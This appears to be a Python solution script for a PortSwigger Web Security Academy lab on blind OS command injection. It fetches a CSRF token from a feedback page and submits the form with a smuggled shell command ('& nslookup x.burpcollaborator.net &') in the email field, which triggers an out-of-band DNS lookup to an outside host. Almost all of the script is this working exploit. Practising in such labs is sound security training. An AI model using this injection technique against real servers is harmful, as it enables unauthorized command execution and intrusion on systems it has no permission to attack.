import requests
from bs4 import BeautifulSoup

site = 'ac821fac1eaaefa8c0486e4000830065.web-security-academy.net'
url = f'''https://{site}'''
post_url = f'''{url}/feedback/submit'''


s = requests.Session()
feedback_url = f'{url}/feedback'
resp = s.get(feedback_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

feedback_submit_url = post_url
post_data = {
    'csrf' : csrf,
    'name' : 'Name',
    'email' : '=x& nslookup x.burpcollaborator.net &',
    'subject' : 'test',
    'message' : 'hello'
}
resp = s.post(feedback_submit_url, data=post_data)
print(resp.text)